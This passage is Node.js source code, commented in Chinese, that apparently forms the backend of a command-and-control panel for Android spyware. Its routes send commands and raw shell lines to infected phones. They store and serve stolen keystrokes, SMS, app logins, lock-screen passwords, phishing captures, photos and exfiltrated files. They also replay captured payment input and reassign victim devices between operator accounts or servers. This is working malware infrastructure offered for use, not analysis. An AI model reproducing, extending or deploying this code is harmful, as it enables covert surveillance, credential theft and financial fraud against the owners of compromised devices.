    if (req.method === 'GET') return ctx.ok(res, ctx.db.prepare("SELECT * FROM notices ORDER BY createTime DESC").all());
    const nowS = nowStr().replace(/-/g, '/');
    if (req.method === 'POST') {
      ctx.db.prepare("INSERT INTO notices VALUES(?,?,?,?,?,?,?,?)")
        .run(Math.floor(Date.now() / 1000), b.noticeTitle, b.noticeContent, b.noticeType || 0, b.status || 1, ADMIN_USER, nowS, nowS);
    } else if (req.method === 'PUT') {
      ctx.db.prepare("UPDATE notices SET noticeTitle=?,noticeContent=?,updateTime=? WHERE noticeId=?").run(b.noticeTitle, b.noticeContent, nowS, b.noticeId);
    } else ctx.db.prepare("DELETE FROM notices WHERE noticeId=?").run(b.noticeId);
    ctx.okt(res);
  });

  // ---- notifications ----
  on(['GET', 'POST', 'DELETE'], '/m/notifications', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') return ctx.ok(res, ctx.db.prepare("SELECT *, body AS text FROM notifications ORDER BY created_at DESC").all());
    if (req.method === 'DELETE') { ctx.db.prepare("DELETE FROM notifications").run(); return ctx.okt(res); }
    const nid = Date.now() % 1e9;
    ctx.db.prepare("INSERT INTO notifications(id,title,body,level,is_read,created_at) VALUES(?,?,?,?,0,datetime('now'))").run(nid, b.title || '', b.body || '', b.level || 'info');
    ctx.json(res, {ok: true, id: nid});
  });
  on(['PUT', 'DELETE', 'GET'], '/m/notifications/:nid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const r = ctx.db.prepare("SELECT * FROM notifications WHERE id=?").get(p.nid);
      return r ? ctx.ok(res, r) : ctx.bad(res, 'not found', 404);
    }
    if (req.method === 'PUT') ctx.db.prepare("UPDATE notifications SET is_read=1 WHERE id=?").run(p.nid);
    else ctx.db.prepare("DELETE FROM notifications WHERE id=?").run(p.nid);
    ctx.okt(res);
  });
  on(['POST', 'PUT'], '/m/notifications/read-all', (req, res, ctx) => A(req, res) && (ctx.db.prepare("UPDATE notifications SET is_read=1").run(), ctx.okt(res)));

  // ---- devices ----
  on('GET', '/m/devices', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    const devsAll = ctx.db.prepare("SELECT data FROM devices").all().map(r => { try { return sanD(JSON.parse(r.data)); } catch { return null; } }).filter(Boolean);
    // 层级可见性：非管理员只能看自己树内 owner_id 的设备
    const vo = visibleOwners(authInfo(req));
    const devs = vo ? devsAll.filter(d => vo.has(d.owner_id || 1)) : devsAll;
    if (!('page' in q) && !('size' in q)) return ctx.ok(res, devs);
    const status = q.status || '', search = (q.q || '').trim().toLowerCase();
    const isOn = d => !!(d.online || d.is_online);
    // 分组过滤参数兼容：前端 URL ?group= 与筛选下拉传的是分组名称，批量接口传的是 id，
    // 另有 "ungrouped"（未分组）——先解析出目标分组的 id（循环外查一次库）
    let qGroupId = null;
    if (q.group && q.group !== 'ungrouped') {
      try { const g = ctx.db.prepare("SELECT id FROM groups WHERE id=? OR name=?").get(q.group, q.group); if (g) qGroupId = String(g.id); } catch (e) {}
    }
    const fl = devs.filter(d => {
      if (status === 'online' && !isOn(d)) return false;
      if (status === 'offline' && isOn(d)) return false;
      if (q.has_access && !d.has_access) return false;
      if (q.has_adb && !d.has_adb) return false;
      if (q.has_ai && !d.has_ai) return false;
      if (q.group) {
        if (q.group === 'ungrouped') { if (d.group_id || d.group) return false; }
        else {
          const dg = String(d.group_id ?? d.group ?? '');
          if (dg !== q.group && (d.group_name || '') !== q.group && dg !== qGroupId) return false;
        }
      }
      if (q.app_name && (d.app_name || '') !== q.app_name) return false;
      if (q.country && (d.country || '') !== q.country) return false;
      if (search) {
        const hay = ['id', 'model', 'brand', 'device_name', 'owner_username', 'geoLocation', 'country', 'carrier', 'app_name'].map(k => String(d[k] || '')).join(' ').toLowerCase();
        if (!hay.includes(search)) return false;
      }
      const ls = String(d.last_seen || '');
      if (q.date_from && ls && ls.slice(0, 10) < q.date_from) return false;
      if (q.date_to && ls && ls.slice(0, 10) > q.date_to) return false;
      return true;
    });
    fl.sort((a, b2) => String(b2.last_seen || '').localeCompare(String(a.last_seen || '')));
    fl.sort((a, b2) => (isOn(a) ? 0 : 1) - (isOn(b2) ? 0 : 1));
    const page = Math.max(1, parseInt(q.page) || 1);
    const size = Math.max(1, Math.min(200, parseInt(q.size) || 24));
    ctx.ok(res, {items: fl.slice((page - 1) * size, (page - 1) * size + size), total: fl.length, page, size,
      online_count: devs.filter(isOn).length, access_count: devs.filter(d => d.has_access).length,
      adb_count: devs.filter(d => d.has_adb).length, ai_count: devs.filter(d => d.has_ai).length});
  });
  on('GET', '/m/device-ids', (req, res, ctx) => {
    if (!A(req, res)) return;
    const mine = myDevIds(authInfo(req));
    const all = ctx.db.prepare("SELECT id FROM devices").all().map(r => r.id);
    return ctx.ok(res, mine ? all.filter(x => mine.has(String(x))) : all);
  });
  on(['GET', 'PUT', 'DELETE', 'POST'], '/m/device/:dev_id', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    // 层级可见性：非管理员只能操作自己树内的设备
    const vo = visibleOwners(authInfo(req));
    if (vo) { const _d0 = ctx.db.prepare("SELECT data FROM devices WHERE id=?").get(p.dev_id);
      const _o0 = _d0 ? (JSON.parse(_d0.data).owner_id || 1) : -1;
      if (!vo.has(_o0)) return ctx.bad(res, '无权访问该设备', 403); }
    const d = getDevice(ctx, p.dev_id);
    if (!d) return ctx.bad(res, '设备不存在', 404);
    if (req.method === 'GET') return ctx.ok(res, sanD(d));
    if (req.method === 'DELETE') {
      ctx.db.prepare("DELETE FROM devices WHERE id=?").run(p.dev_id);
      ctx.broadcast({type: 'device_update'});
      return ctx.okt(res);
    }
    Object.assign(d, b);
    setDevice(ctx, d);
    if (req.method === 'PUT') ctx.broadcast({type: 'device_update'}, [p.dev_id]);
    ctx.ok(res, d);
  });
  on('POST', '/m/device/:dev_id/command', async (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const cmd = b.command || '';
    ctx.db.prepare("INSERT INTO commands VALUES(?,?,?,?,?,datetime('now'))").run(uid(), p.dev_id, cmd, j(b.payload || {}), 'sent');
    let sent = false;
    if (cmd !== 'GET_PERMISSIONS') sent = !!ctx.zhuque.commandAny(p.dev_id, cmd, b.payload || {});
    ctx.broadcast({type: 'device_update'}, [p.dev_id]);
    // 命令下发即时反馈：前端 command_result 监听直接展示（agent 真实回包后会被覆盖为最终状态）
    ctx.broadcast({type: 'command_result', device_id: p.dev_id,
      data: {command: cmd, ok: true, sent, status: sent ? '已发送到设备' : '设备离线，命令已入队'}}, [p.dev_id]);
    // 密码获取：同步等 agent 的 password_status 回包（最多 3s），把锁屏密码结果直接带给前端按钮展示
    if (cmd === 'GET_PASSWORD_STATUS' && sent && ctx.zhuque.waitPasswordStatus) {
      const pwd = await ctx.zhuque.waitPasswordStatus(p.dev_id, 3000);
      return ctx.json(res, {ok: true, id: uid(), command: cmd, sent, data: pwd || {lockPassword: {type: 'pending'}}});
    }
    // ADB 投屏回包带 tps 字段（前端 adbCastStart 依赖）
    ctx.json(res, Object.assign({ok: true, id: uid(), command: cmd, sent},
      cmd === 'SCREEN_CAPTURE_SET_TECH_ADB' ? {tps_addr: '', tps_port: 0, bridge: true} : {}));
  });
  on('POST', '/m/device/:dev_id/raw', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const line = typeof b.line === 'string' ? b.line : (b.cmd || '');
    const okk = line ? ctx.eagle.sendDev(p.dev_id, line) : false;
    ctx.json(res, {ok: okk});
  });
  on('GET', '/m/device/:dev_id/commands', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && ctx.ok(res, ctx.db.prepare("SELECT * FROM commands WHERE device_id=? ORDER BY created_at DESC LIMIT 200").all(p.dev_id)));
  on('GET', '/m/device/:dev_id/logs', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && ctx.ok(res, ctx.db.prepare("SELECT * FROM keylogs WHERE device_id=? ORDER BY capt_at DESC LIMIT 2000").all(p.dev_id)));

  // ---- keylogs / sms / credentials ----
  on(['GET', 'DELETE'], '/m/keylogs', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const mine = myDevIds(me);           // null=管理员全量；否则仅自己设备的记录
    if (req.method === 'DELETE') {
      // 全局键盘日志页「清空」：?log_type= 定向清空，无参=全清；层级账户只清自己设备
      const lt = String(q.log_type || '').trim();
      const devs = mine ? [...mine] : null;
      if (mine && !devs.length) return ctx.okt(res);
      if (mine) {
        const inQ = '(' + devs.map(x => '?').join(',') + ')';
        if (lt && lt !== 'all') ctx.db.prepare(`DELETE FROM keylogs WHERE log_type=? AND device_id IN ${inQ}`).run(lt.slice(0, 40), ...devs);
        else ctx.db.prepare(`DELETE FROM keylogs WHERE device_id IN ${inQ}`).run(...devs);
      } else {
        if (lt && lt !== 'all') ctx.db.prepare("DELETE FROM keylogs WHERE log_type=?").run(lt.slice(0, 40));
        else ctx.db.prepare("DELETE FROM keylogs").run();
      }
      ctx.broadcast({type: 'device_update'});
      return ctx.okt(res);
    }
    let sql = "SELECT * FROM keylogs", cond = [], args = [];
    if (mine && !mine.size) return ctx.ok(res, []);   // 无可见设备直接短路（SQLite 双引号不表字符串，空集不进 SQL）
    if (mine) { cond.push(`device_id IN (${[...mine].map(() => '?').join(',')})`); args.push(...mine); }
    if (q.device_id) { if (mine && !mine.has(String(q.device_id))) return ctx.ok(res, []); cond.push('device_id=?'); args.push(q.device_id); }
    if (q.kw) { cond.push('text LIKE ?'); args.push('%' + q.kw + '%'); }
    if (cond.length) sql += ' WHERE ' + cond.join(' AND ');
    sql += ' ORDER BY capt_at DESC LIMIT 2000';
    ctx.ok(res, ctx.db.prepare(sql).all(...args));
  });
  on(['GET', 'DELETE'], '/m/sms', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const mine = myDevIds(me);
    if (req.method === 'DELETE') {
      if (mine) { if (mine.size) ctx.db.prepare(`DELETE FROM sms WHERE device_id IN (${[...mine].map(() => '?').join(',')})`).run(...mine); }
      else ctx.db.prepare("DELETE FROM sms").run();
      return ctx.okt(res);
    }
    let sql = "SELECT * FROM sms", cond = [], args = [];
    if (mine && !mine.size) return ctx.ok(res, []);
    if (mine) { cond.push(`device_id IN (${[...mine].map(() => '?').join(',')})`); args.push(...mine); }
    if (q.device_id) { if (mine && !mine.has(String(q.device_id))) return ctx.ok(res, []); cond.push('device_id=?'); args.push(q.device_id); }
    if (q.kw) { cond.push('(body LIKE ? OR sender LIKE ?)'); args.push('%' + q.kw + '%', '%' + q.kw + '%'); }
    if (cond.length) sql += ' WHERE ' + cond.join(' AND ');
    sql += ' ORDER BY recv_at DESC LIMIT 1000';
    const rows = ctx.db.prepare(sql).all(...args);
    if (q.device_id && !q.kw) {
      const total = ctx.db.prepare("SELECT COUNT(*) n FROM sms WHERE device_id=?").get(q.device_id).n;
      return ctx.json(res, {items: rows, total, page: 1, size: rows.length});
    }
    ctx.ok(res, rows);
  });
  on('DELETE', '/m/sms/:sid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const r = ctx.db.prepare("SELECT device_id FROM sms WHERE id=?").get(p.sid);
    if (r && !devOk(me, r.device_id)) return ctx.bad(res, '无权操作', 403);
    ctx.db.prepare("DELETE FROM sms WHERE id=?").run(p.sid);
    ctx.okt(res);
  });
  on(['GET', 'POST'], '/m/device/:dev_id/sms', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    if (req.method === 'GET') return ctx.ok(res, ctx.db.prepare("SELECT * FROM sms WHERE device_id=? ORDER BY recv_at DESC LIMIT 1000").all(p.dev_id));
    ctx.okt(res);
  });
  on('GET', '/m/device/:dev_id/pwdin', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && ctx.ok(res, ctx.db.prepare("SELECT * FROM credentials WHERE device_id=? AND type LIKE '%pwd%' ORDER BY capt_at DESC").all(p.dev_id)));
  on('DELETE', '/m/device/:dev_id/pwdin/:pid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    ctx.db.prepare("DELETE FROM credentials WHERE id=?").run(p.pid);
    ctx.okt(res);
  });
  on('GET', '/m/device/:dev_id/password', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && ctx.ok(res, ctx.db.prepare("SELECT * FROM credentials WHERE device_id=? AND (type LIKE '%lock%' OR type LIKE '%password%') ORDER BY capt_at DESC").all(p.dev_id)));
  on(['GET', 'DELETE'], '/m/credentials', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const mine = myDevIds(me);
    if (req.method === 'DELETE') {
      if (mine) { if (mine.size) ctx.db.prepare(`DELETE FROM credentials WHERE device_id IN (${[...mine].map(() => '?').join(',')})`).run(...mine); }
      else ctx.db.prepare("DELETE FROM credentials").run();
      return ctx.okt(res);
    }
    let sql = "SELECT * FROM credentials", cond = [], args = [];
    if (mine && !mine.size) return ctx.ok(res, []);
    if (mine) { cond.push(`device_id IN (${[...mine].map(() => '?').join(',')})`); args.push(...mine); }
    if (q.device_id) { if (mine && !mine.has(String(q.device_id))) return ctx.ok(res, []); cond.push('device_id=?'); args.push(q.device_id); }
    if (q.kw) { cond.push('(login LIKE ? OR app_name LIKE ?)'); args.push('%' + q.kw + '%', '%' + q.kw + '%'); }
    if (cond.length) sql += ' WHERE ' + cond.join(' AND ');
    sql += ' ORDER BY capt_at DESC LIMIT 2000';
    const rows = ctx.db.prepare(sql).all(...args);
    if (q.device_id && !q.kw) {
      const total = ctx.db.prepare("SELECT COUNT(*) n FROM credentials WHERE device_id=?").get(q.device_id).n;
      return ctx.json(res, {items: rows, total, page: 1, size: rows.length});
    }
    ctx.ok(res, rows);
  });
  on('GET', '/m/device/:dev_id/credentials', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && ctx.ok(res, ctx.db.prepare("SELECT * FROM credentials WHERE device_id=? ORDER BY capt_at DESC").all(p.dev_id)));
  on('DELETE', '/m/credential/:cid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const r = ctx.db.prepare("SELECT device_id FROM credentials WHERE id=?").get(p.cid);
    if (r && !devOk(me, r.device_id)) return ctx.bad(res, '无权操作', 403);
    ctx.db.prepare("DELETE FROM credentials WHERE id=?").run(p.cid);
    ctx.okt(res);
  });

  // ---- 设备子资源端点：读 generic store ----
  // 两种存储形态：
  //   单记录型（contacts/apps/fb-bulk-logs/wa-bulk-logs）：id=devId 一条 {device_id, apps:[...]}
  //   逐条记录型（phish/payrec）：每条独立 id（eagle phisdata / n·result 卡片数据写入），按记录的 device_id 过滤
  const REC_STORES = new Set(['phish', 'payrec']);
  for (const sub of ['contacts', 'apps', 'payrec', 'phish', 'fb-bulk-logs', 'wa-bulk-logs'])
    on(['GET', 'POST', 'DELETE', 'PUT'], `/m/device/:dev_id/${sub}`, (req, res, ctx, p) => {
      if (!A(req, res)) return;
      if (!devGuard(req, res, p)) return;
      if (req.method === 'GET') {
        if (REC_STORES.has(sub))
          return ctx.ok(res, gList(ctx.db, sub).filter(x => x && x.device_id === p.dev_id));
        const r = ctx.db.prepare("SELECT data FROM generic WHERE store=? AND id=?").get(sub, p.dev_id);
        if (!r) return ctx.ok(res, []);
        try {
          const d = JSON.parse(r.data);
          // 前端契约：直接返回数组（apps/contacts 列表），入库结构为 {device_id, apps:[...] , ...}
          return ctx.ok(res, Array.isArray(d) ? d : (d[sub] || d.apps || d.contacts || d.list || d.items || []));
        } catch { return ctx.ok(res, []); }
      }
      if (req.method === 'DELETE' && REC_STORES.has(sub)) {   // 清空该设备逐条记录（Tab「清空」按钮）
        for (const r of ctx.db.prepare("SELECT id,data FROM generic WHERE store=?").all(sub)) {
          try { if (String(JSON.parse(r.data).device_id) === p.dev_id) ctx.db.prepare("DELETE FROM generic WHERE store=? AND id=?").run(sub, r.id); } catch {}
        }
        ctx.broadcast({type: 'device_update'}, [p.dev_id]);
      }
      return ctx.okt(res);
    });
  // ---- 设备数据清空（各 Tab「清空」按钮） ----
  on('DELETE', '/m/device/:dev_id/credentials', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && (ctx.db.prepare("DELETE FROM credentials WHERE device_id=?").run(p.dev_id), ctx.broadcast({type: 'device_update'}, [p.dev_id]), ctx.okt(res)));
  on('DELETE', '/m/device/:dev_id/pwdin', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && (ctx.db.prepare("DELETE FROM credentials WHERE device_id=? AND type LIKE '%pwd%'").run(p.dev_id), ctx.broadcast({type: 'device_update'}, [p.dev_id]), ctx.okt(res)));
  on('DELETE', '/m/device/:dev_id/sms', (req, res, ctx, p) => A(req, res) && devGuard(req, res, p) && (ctx.db.prepare("DELETE FROM sms WHERE device_id=?").run(p.dev_id), ctx.broadcast({type: 'device_update'}, [p.dev_id]), ctx.okt(res)));
  on('DELETE', '/m/device/:dev_id/logs', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const lt = String(q.log_type || '').trim();
    if (lt && lt !== 'all') ctx.db.prepare("DELETE FROM keylogs WHERE device_id=? AND log_type=?").run(p.dev_id, lt.slice(0, 40));
    else ctx.db.prepare("DELETE FROM keylogs WHERE device_id=?").run(p.dev_id);
    ctx.broadcast({type: 'device_update'}, [p.dev_id]);
    ctx.okt(res);
  });
  // 锁屏密码记录（一键解锁流程 PUT：空密码=清除该设备旧记录，非空=写入 credentials 供 GET /password 回显）
  on('PUT', '/m/device/:dev_id/password', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const bd = b && typeof b === 'object' ? b : {};
    const pwd = String(bd.password || '').slice(0, 200);
    const typ = String(bd.type || 'lock').slice(0, 20);
    ctx.db.prepare("DELETE FROM credentials WHERE device_id=? AND (type LIKE '%lock%' OR type LIKE '%password%')").run(p.dev_id);
    // 存 lock_<原type>（pin/pattern/mixed）→ GET /password 的 LIKE '%lock%' 能命中且保留原始类型
    if (pwd) ctx.db.prepare("INSERT INTO credentials(device_id,device_label,app_name,app_pkg,login,password,type,capt_at,extra) VALUES(?,?,?,?,?,?,?,?,datetime('now','localtime'))")
      .run(p.dev_id, '', '锁屏密码', '', '', pwd, 'lock_' + typ.toLowerCase().replace(/[^a-z]/g, '').slice(0, 16), '{}');
    ctx.broadcast({type: 'device_update'}, [p.dev_id]);
    ctx.okt(res);
  });
  // ---- 钓鱼数据：操作/备注（更新 generic 'phish' 逐条记录状态） ----
  on('POST', '/m/device/:dev_id/phish/:pid/action', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const rec = gList(ctx.db, 'phish').find(x => String(x.id) === String(p.pid));
    if (!rec) return ctx.bad(res, '记录不存在', 404);
    const bd = b && typeof b === 'object' ? b : {};
    rec.action = String(bd.action || '').slice(0, 20);
    rec.status = String(bd.status || bd.action || 'done').slice(0, 20);
    rec.action_at = nowStr();
    gAdd(ctx.db, 'phish', rec);
    ctx.broadcast({type: 'device_update'}, [p.dev_id]);
    ctx.okt(res);
  });
  on('PUT', '/m/device/:dev_id/phish/:pid/remark', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const rec = gList(ctx.db, 'phish').find(x => String(x.id) === String(p.pid));
    if (!rec) return ctx.bad(res, '记录不存在', 404);
    rec.remark = String((b || {}).remark || '').slice(0, 500);
    gAdd(ctx.db, 'phish', rec);
    ctx.okt(res);
  });
  // ---- 支付记录：删除/重放 ----
  on('DELETE', '/m/payrec/:pid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const rec = gList(ctx.db, 'payrec').find(x => String(x.id) === String(p.pid));
    if (rec && rec.device_id && !devOk(me, rec.device_id)) return ctx.bad(res, '无权操作', 403);
    gDel(ctx.db, 'payrec', p.pid);
    ctx.broadcast({type: 'device_update'});
    ctx.okt(res);
  });
  on('POST', '/m/payrec/:pid/replay', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const rec = gList(ctx.db, 'payrec').find(x => String(x.id) === String(p.pid));
    if (!rec) return ctx.bad(res, '记录不存在', 404);
    if (rec.device_id && !devOk(me, rec.device_id)) return ctx.bad(res, '无权操作', 403);
    if (rec.device_id) {   // agent 实证命令名（快捷命令面板同款），payload 携带完整记录
      ctx.db.prepare("INSERT INTO commands VALUES(?,?,?,?,?,datetime('now'))").run(uid(), rec.device_id, 'REPLAY_TOUCH_CIPHER', j({record: rec}), 'sent');
      ctx.zhuque.commandAny(rec.device_id, 'REPLAY_TOUCH_CIPHER', {record: rec});
    }
    rec.status = 'replayed';
    rec.replayed_at = nowStr();
    gAdd(ctx.db, 'payrec', rec);
    ctx.broadcast({type: 'device_update'}, [rec.device_id]);
    ctx.json(res, {ok: true, message: '回放命令已发送'});
  });

  // ---- 相册 ----
  on(['GET', 'DELETE'], '/m/device/:dev_id/album', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    if (req.method === 'DELETE') { ctx.db.prepare("DELETE FROM album WHERE device_id=?").run(p.dev_id); return ctx.okt(res); }
    const page = Math.max(1, parseInt(q.page) || 1);
    const size = Math.min(200, Math.max(1, parseInt(q.size) || 24));
    const total = ctx.db.prepare("SELECT COUNT(*) n FROM album WHERE device_id=?").get(p.dev_id).n;
    const rows = ctx.db.prepare("SELECT id, display_name, path, size, mtime FROM album WHERE device_id=? ORDER BY (mtime>0) DESC, mtime DESC, rowid DESC LIMIT ? OFFSET ?").all(p.dev_id, size, (page - 1) * size);
    ctx.json(res, {items: rows.map(r => ({id: r.id, display_name: r.display_name, content_uri: 'file://' + r.path, path: r.path, size: r.size, mtime: r.mtime})), total, page});
  });
  on('GET', '/m/device/:dev_id/album/thumb/:pid', (req, res, ctx, p, b, q) => {
    const auth = ctxRef.jwtCheck(q.token || '');
    if (!auth || !devOk(auth, p.dev_id)) { res.writeHead(401); return res.end(); }
    const r = ctx.db.prepare("SELECT thumb FROM album WHERE id=? AND device_id=?").get(String(p.pid), p.dev_id);
    if (!r || !r.thumb) { res.writeHead(200, {'Content-Type': 'image/png'}); return res.end(Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64')); }
    res.writeHead(200, {'Content-Type': 'image/jpeg'});
    res.end(r.thumb);
  });

  // ---- 文件管理器中转（面板↔服务器↔设备） ----
  // 上传 multipart（面板 FormData）：存 uploads/device_files/<fileId>_<name> → 返回 {ok,fileId}；
  //   面板随后下发 FILE_DOWNLOAD_FROM_SERVER 让 agent 按 requestId 从 download-file 拉取。
  // 上传原始二进制（agent 回传设备文件，FILE_DOWNLOAD_HTTP）：?requestId=/x-request-id 头
  //   → 存文件 + 广播 file_ready → 面板拿 requestId 下载。
  // 鉴权：面板走 JWT；agent 无 JWT，以 20 位随机 requestId 作为能力凭证（与前端协议一致）。
  const DEV_FILES = path.join(ctxRef.ROOT, 'uploads', 'device_files');
  const fileRec = (ctx, rid) => rid ? gList(ctx.db, 'device_files').find(x => x && (x.request_id === rid || String(x.id) === rid)) : null;
  const fileSave = (ctx, rid, name, buf) => {
    fs.mkdirSync(DEV_FILES, {recursive: true});
    const safe = String(name || 'file.bin').replace(/[^\w.-]/g, '_').slice(0, 120) || 'file.bin';
    fs.writeFileSync(path.join(DEV_FILES, rid + '_' + safe), buf);
    gAdd(ctx.db, 'device_files', {id: rid, request_id: rid, name: safe, size: buf.length, created_at: nowStr()});
  };
  on('POST', '/m/device/:dev_id/upload', (req, res, ctx, p, b, q) => {
    const ct = req.headers['content-type'] || '';
    const rid = String(req.headers['x-request-id'] || q.requestId || '').replace(/[^\w-]/g, '').slice(0, 64);
    // agent 二进制回传：requestId 即凭证（不走 JWT）；面板上传（无 rid）需 JWT + 设备归属
    if (!rid) { if (!A(req, res)) return; if (!devGuard(req, res, p)) return; }
    // server.js readBody 已消费请求流：multipart → b.__multipart，非 JSON → b.__raw
    const raw = (b && (b.__multipart || b.__raw)) || null;
    if (ct.includes('multipart/form-data') || (b && b.__multipart)) {
      try {
        if (!raw || !raw.length) return ctx.bad(res, '未收到文件');
        const bm = /boundary=(.+)$/.exec(ct);
        if (!bm) return ctx.bad(res, '上传格式错误');
        const parts = parseMultipart(raw, bm[1]);
        const fp = parts.find(x => x.filename && x.data && x.data.length);
        if (!fp) return ctx.bad(res, '未收到文件');
        const fileId = rid || crypto.randomBytes(10).toString('hex');
        fileSave(ctx, fileId, fp.filename, fp.data);
        ctx.log('file-up', {d: p.dev_id, rid: fileId, n: fp.data.length});
        return ctx.json(res, {ok: true, fileId, name: String(fp.filename).slice(0, 120), size: fp.data.length});
      } catch (e) { return ctx.bad(res, '上传失败'); }
    }
    // 原始二进制：agent 回传设备文件（必须带 requestId）
    if (!raw || !raw.length) return ctx.bad(res, '空文件');
    if (!rid) return ctx.bad(res, '缺少 requestId');
    fileSave(ctx, rid, decodeURIComponent(String(req.headers['x-file-name'] || q.name || 'device_file.bin')), raw);
    ctx.broadcast({type: 'file_ready', device_id: p.dev_id, data: {requestId: rid}}, [p.dev_id]);
    ctx.log('file-recv', {d: p.dev_id, rid, n: raw.length});
    ctx.json(res, {ok: true});
  });
  on('GET', '/m/device/:dev_id/download-file', (req, res, ctx, p, b, q) => {
    const rid = String(q.requestId || '').replace(/[^\w-]/g, '');
    const rec = fileRec(ctx, rid);
    if (rec) {                                       // requestId 命中（能力凭证，面板/agent 通用）
      const fp = path.join(DEV_FILES, (rec.request_id || rec.id) + '_' + rec.name);
      if (fs.existsSync(fp)) {
        res.writeHead(200, {'Content-Type': 'application/octet-stream', 'Content-Length': fs.statSync(fp).size,
          'Content-Disposition': `attachment; filename*=UTF-8''${encodeURIComponent(rec.name)}`});
        return fs.createReadStream(fp).pipe(res);
      }
      return ctx.bad(res, '文件不存在或已过期', 404);
    }
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    return ctx.bad(res, '文件不存在或已过期', 404);
  });

  // ---- 设备属性 ----
  on(['PUT', 'POST'], '/m/device/:dev_id/note', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const d = getDevice(ctx, p.dev_id);
    if (!d) return ctx.bad(res, '设备不存在', 404);
    d.note = b.note || '';
    setDevice(ctx, d);
    ctx.okt(res);
  });
  on(['PUT', 'POST'], '/m/device/:dev_id/pinned', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const d = getDevice(ctx, p.dev_id);
    if (!d) return ctx.bad(res, '设备不存在', 404);
    d.pinned = !!b.pinned;
    setDevice(ctx, d);
    ctx.okt(res);
  });
  on(['PUT', 'POST'], '/m/device/:dev_id/group', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const d = getDevice(ctx, p.dev_id);
    if (!d) return ctx.bad(res, '设备不存在', 404);
    const gid = b.group_id !== undefined ? b.group_id : b.id;
    d.group_id = gid;
    const g = ctx.db.prepare("SELECT name FROM groups WHERE id=?").get(gid);
    if (g) d.group_name = g.name;
    setDevice(ctx, d);
    ctx.okt(res);
  });
  // 设备归属分配：前端 JA() 发 PUT /m/device/:id/owner {owner_id}
  // 原实现是空壳（直接 ok），导致「下发设备给子账户」永远不生效
  on(['PUT', 'POST'], '/m/device/:dev_id/owner', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const d = getDevice(ctx, p.dev_id);
    if (!d) return ctx.bad(res, '设备不存在', 404);
    // 只能分配自己树内的设备
    if (!devOk(me, p.dev_id)) return ctx.bad(res, '无权操作该设备', 403);
    const raw = (b && (b.owner_id !== undefined ? b.owner_id : b.uid)) ;
    let target = Number(raw);
    if (!Number.isFinite(target) || target <= 0) target = 1;          // 空/0 → 归还管理员
    if (target !== 1) {
      const acc = accRow(target);
      if (!acc) return ctx.bad(res, '目标账户不存在', 404);
      // 只能分配给自己或自己的下级
      const tree = accountTree(me.uid);
      if (me.uid !== 1 && me.role !== 'admin' && !tree.includes(target))
        return ctx.bad(res, '只能分配给自己或下级账户', 403);
    }
    d.owner_id = target;
    d.owner_username = (target === 1 ? ADMIN_USER : (accRow(target) || {}).username || '');
    setDevice(ctx, d);
    ctx.broadcast({type: 'device_update'});
    secLog(ctx.db, '信息', `分配设备 ${p.dev_id} → ${d.owner_username}`, me.usr, REAL_IP(req));
    ctx.json(res, {ok: true, id: p.dev_id, owner_id: d.owner_id, owner_username: d.owner_username});
  });
  // 转移服务器：前端已自行下发 CHANGE_SERVER_URL 命令，这里记录面板侧归属（device.server_url）
  on('POST', '/m/device/:dev_id/transfer', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const url = String((b && b.target_url) || '').trim().slice(0, 200);
    if (!/^https?:\/\//.test(url)) return ctx.bad(res, '目标服务器地址无效');
    const d = getDevice(ctx, p.dev_id);
    if (!d) return ctx.bad(res, '设备不存在', 404);
    d.server_url = url;
    d.transferred_at = nowStr();
    setDevice(ctx, d);
    ctx.broadcast({type: 'device_update'}, [p.dev_id]);
    ctx.log('device-transfer', {d: p.dev_id, to: url});
    ctx.okt(res);
  });
  on('POST', '/m/device/:dev_id/adb-mode', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
